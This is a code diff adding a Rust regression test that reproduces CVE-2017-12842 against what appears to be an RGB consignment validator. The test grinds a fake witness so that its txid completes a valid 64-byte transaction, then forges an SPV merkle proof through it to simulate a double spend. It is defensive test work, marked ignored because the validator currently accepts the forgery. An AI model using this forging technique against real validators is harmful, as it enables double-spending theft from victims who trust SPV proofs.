@@ -6598,3 +6598,232 @@ fn bundles_size_alloc_bomb() {
         String::from_utf8_lossy(&out.stderr)
     );
 }
+
+/// CVE-2017-12842: an SPV proof can go through a 64-byte transaction as if it was a merkle node.
+///
+/// The attacker pays the victim with a witness `F` which is never broadcast, and grinds it so that
+/// its txid is the second half of a valid 64-byte transaction `T`. Once `T` is mined, the merkle
+/// path of `T` extended with `T`'s first half "proves" that `F` sits one level below `T` in the
+/// same block. A victim trusting that proof sees the transfer as mined while `F` does not exist,
+/// leaving the attacker free to spend the same allocation again.
+///
+/// The victim's header for the block mining `T` is mocked: it stands in for the one step of the
+/// attack a test cannot afford, getting `T` mined, which takes ~2^40 more hashes to make `T` spend
+/// a real UTXO as well.
+#[test]
+#[ignore = "SpvProof::validate accepts 64-byte TXs as merkle nodes"]
+fn validate_consignment_spv_proof_64_byte_tx() {
+    /// Resolver of a victim whose chain has, at `height`, the block with header `header`, and
+    /// which knows no witness.
+    struct ForgedBlockResolver {
+        height: NonZeroU32,
+        header: BlockHeader,
+    }
+
+    impl ResolveWitness for ForgedBlockResolver {
+        fn resolve_witness(&self, _: Txid) -> Result<WitnessStatus, WitnessResolverError> {
+            Ok(WitnessStatus::Unresolved)
+        }
+
+        fn get_block_header(
+            &self,
+            height: NonZeroU32,
+        ) -> Result<BlockHeader, WitnessResolverError> {
+            if height == self.height {
+                Ok(self.header)
+            } else {
+                Err(WitnessResolverError::NotSupported)
+            }
+        }
+
+        fn check_chain_net(&self, _: ChainNet) -> Result<(), WitnessResolverError> {
+            Ok(())
+        }
+    }
+
+    // F's lock time, ground for F's txid to be the second half of a valid 64-byte TX: it has to
+    // read 0x00, 0x01 and 0x04 where such a TX has its scriptSig length, output count and
+    // scriptPubkey length. Everything else in F is fixed, blinding and MPC entropy included, so
+    // F's txid is too. If F changes, any lock time giving `txid[9] == 0x00 && txid[14] == 0x01
+    // && txid[23] == 0x04` works, e.g. scanning from 0 (~2^24 attempts).
+    const LOCK_TIME: u32 = 12914214;
+
+    // a dumb asset: genesis allocates to a single seal, which a transition spends
+    let schema = Schema {
+        ffv: zero!(),
+        name: tn!("DumbAsset"),
+        meta_types: none!(),
+        global_types: none!(),
+        owned_types: tiny_bmap! {
+            OS_ASSET => AssignmentDetails {
+                owned_state_schema: OwnedStateSchema::Fungible(FungibleType::Unsigned64Bit),
+                name: fname!("assetOwner"),
+                default_transition: TS_TRANSFER,
+            },
+        },
+        genesis: GenesisSchema {
+            metadata: none!(),
+            globals: none!(),
+            assignments: tiny_bmap! {
+                OS_ASSET => Occurrences::Once,
+            },
+            validator: None,
+        },
+        transitions: tiny_bmap! {
+            TS_TRANSFER => TransitionDetails {
+                transition_schema: TransitionSchema {
+                    metadata: none!(),
+                    globals: none!(),
+                    inputs: tiny_bmap! {
+                        OS_ASSET => Occurrences::Once,
+                    },
+                    assignments: none!(),
+                    validator: None,
+                },
+                name: fname!("transfer"),
+            },
+        },
+        default_assignment: Some(OS_ASSET),
+    };
+    let rules = SchemaDefinition::new(schema, none!(), none!())
+        .verify()
+        .unwrap();
+    let outpoint =
+        Outpoint::from_str("cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc:0")
+            .unwrap();
+    let seal = BuilderSeal::Revealed(GenesisSeal::with_blinding(outpoint.txid, outpoint.vout, 42));
+    let contract = ContractBuilder::with(strict_dumb!(), rules.clone(), ChainNet::BitcoinRegtest)
+        .add_fungible_state("assetOwner", seal, 14u64)
+        .unwrap()
+        .issue_contract_raw(42)
+        .unwrap()
+        .into_consignment();
+    let contract_id = contract.contract_id();
+    let opout = Opout::new(contract.genesis().id(), OS_ASSET, 0);
+    let transition = Transition {
+        contract_id,
+        transition_type: TS_TRANSFER,
+        inputs: NonEmptyOrdSet::with(opout).into(),
+        ..strict_dumb!()
+    };
+    let opid = transition.id();
+    let bundle = TransitionBundle {
+        input_map: NonEmptyOrdMap::with_key_value(opout, opid),
+        known_transitions: NonEmptyVec::with(KnownTransition::new(opid, transition)),
+    };
+
+    // F spends the genesis seal and commits to the bundle; the attacker never broadcasts it
+    let mut psbt = Psbt::from_unsigned_tx(Transaction {
+        version: Version::ONE,
+        lock_time: LockTime::from_consensus(LOCK_TIME),
+        input: vec![TxIn {
+            previous_output: outpoint,
+            script_sig: ScriptBuf::new(),
+            sequence: Sequence(0),
+            witness: Witness::new(),
+        }],
+        output: vec![TxOut {
+            value: bitcoin::Amount::ZERO,
+            script_pubkey: ScriptBuf::new_op_return([]),
+        }],
+    })
+    .unwrap();
+    psbt.inputs[0].witness_utxo = Some(TxOut {
+        value: bitcoin::Amount::from_sat(1000),
+        script_pubkey: ScriptBuf::new_p2a(),
+    });
+    let protocol_id = mpc::ProtocolId::from(contract_id);
+    let output = &mut psbt.outputs[0];
+    output.set_opret_host();
+    output.set_mpc_entropy(42).unwrap();
+    output
+        .set_mpc_message(protocol_id, mpc::Message::from(bundle.bundle_id()))
+        .unwrap();
+    let (commitment, mpc_proof) = output.mpc_commit().unwrap();
+    output.opret_commit(commitment).unwrap();
+    psbt.set_opret_commitment(0);
+    let fake = psbt.extract_tx().unwrap();
+    let fake_txid = fake.compute_txid();
+    let anchor = Anchor::new(
+        mpc_proof.to_merkle_proof(protocol_id).unwrap(),
+        DbcProof::Opret(OpretProof::strict_dumb()),
+    );
+
+    // T: its first half is the version, the input count and the first 27 bytes of the TXID it
+    // spends, its second half is F's txid
+    let mut t_bytes = [0u8; 64];
+    t_bytes[..4].copy_from_slice(&2u32.to_le_bytes());
+    t_bytes[4] = 0x01;
+    t_bytes[5..32].copy_from_slice(&[0xab; 27]);
+    t_bytes[32..].copy_from_slice(&fake_txid.to_byte_array());
+    let t: Transaction = bitcoin::consensus::deserialize(&t_bytes)
+        .expect("T must be a valid 64-byte TX for it to be mined");
+    assert_eq!(bitcoin::consensus::serialize(&t).len(), 64);
+    let t_txid = t.compute_txid();
+    assert_eq!(
+        t_txid.to_raw_hash(),
+        sha256d::Hash::hash(&t_bytes),
+        "T's TXID is the hash of its two halves"
+    );
+
+    // T gets mined in a block with a coinbase C
+    let height = NonZeroU32::new(106).unwrap();
+    let coinbase = TxMerkleNode::from_byte_array([0xcb; 32]);
+    let mut engine = sha256d::Hash::engine();
+    engine.input(&coinbase.to_byte_array());
+    engine.input(&t_txid.to_byte_array());
+    let resolver = ForgedBlockResolver {
+        height,
+        header: BlockHeader {
+            version: BlockVersion::ONE,
+            prev_blockhash: BlockHash::all_zeros(),
+            merkle_root: TxMerkleNode::from_raw_hash(sha256d::Hash::from_engine(engine)),
+            time: 1726062111,
+            bits: CompactTarget::from_consensus(0x207fffff),
+            nonce: 0,
+        },
+    };
+    // T is provable: position 1 of the block, with sibling C
+    let t_proof = SpvProof {
+        block_height: height,
+        pos: 1,
+        merkle: Confined::try_from(vec![coinbase]).unwrap(),
+    };
+    t_proof.validate(t_txid, &resolver.header).unwrap();
+
+    // the forged proof places F as the right child of T, going through T as an inner node
+    let forged_proof = SpvProof {
+        block_height: height,
+        pos: 3,
+        merkle: Confined::try_from(vec![
+            TxMerkleNode::from_byte_array(t_bytes[..32].try_into().unwrap()),
+            coinbase,
+        ])
+        .unwrap(),
+    };
+    let mut wbundle = WitnessBundle::with(fake, anchor, bundle);
+    wbundle.spv_proof = Some(forged_proof);
+    let forged = Consignment::<true> {
+        transfer: true,
+        bundles: Confined::from_checked(vec![wbundle]),
+        genesis: contract.genesis,
+        ..strict_dumb!()
+    };
+
+    // the victim must not take F as mined: with no valid proof, it falls back to the resolver,
+    // which does not know F
+    let res = forged.validate(
+        &rules,
+        &resolver,
+        &ValidationConfig {
+            chain_net: ChainNet::BitcoinRegtest,
+            ..Default::default()
+        },
+    );
+    match res {
+        Err(ValidationError::InvalidConsignment(Failure::SealNoPubWitness(_, txid)))
+            if txid == fake_txid => {}
+        Ok(_) => panic!("victim accepted a transfer whose witness {fake_txid} was never mined"),
+        Err(err) => panic!("unexpected validation error: {err:?}"),
+    }
+}
